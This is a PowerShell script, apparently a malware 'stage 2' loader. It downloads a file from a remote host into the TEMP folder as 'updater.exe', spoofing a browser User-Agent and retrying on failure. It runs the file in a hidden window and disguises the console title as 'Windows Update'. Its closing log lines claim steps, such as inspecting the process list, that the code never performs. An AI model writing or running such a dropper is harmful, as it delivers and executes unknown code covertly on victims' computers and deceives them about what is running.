
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://adatum.com:443/stage1.ps1",
    [string]$DownloadPath = "$env:TEMP\updater.exe",
    [string]$TracePath = "$env:TEMP\stage.log",
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TimeoutSec = 107,
    [int]$MaxAttempts = 4,
    [int]$BackoffSeconds = 20
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 4,
        [int]$RetryDelay = 20,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TargetUrl
    $OperationResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $DownloadPath -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $BrowserAgent
    if ($OperationResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $DownloadPath -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TargetUrl
    Destination = $DownloadPath
    RetryCount = $MaxAttempts
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Starting workflow"
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Reading configuration values"
Write-Verbose "Preparing working directory"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "stage marker 9 reached"
$ProgressPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Windows Update"
